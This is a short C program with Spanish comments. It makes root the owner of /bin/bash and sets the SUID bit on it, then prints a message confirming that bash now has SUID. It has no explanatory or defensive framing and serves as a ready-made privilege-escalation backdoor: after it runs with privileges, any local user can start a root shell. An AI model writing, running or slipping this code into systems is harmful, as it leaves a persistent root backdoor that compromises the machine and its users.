#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

int main() {
    const char *bash_path = "/bin/bash";

    // Cambia el owner a root
    if (chown(bash_path, 0, 0) != 0) {
        perror("chown");
        return 1;
    }

    // Cambia permisos: agrega bit SUID
    if (chmod(bash_path, 04755) != 0) {
        perror("chmod");
        return 1;
    }

    printf("✅ /bin/bash ahora tiene SUID.\n");
    return 0;  // Opcional, pero buena práctica
}
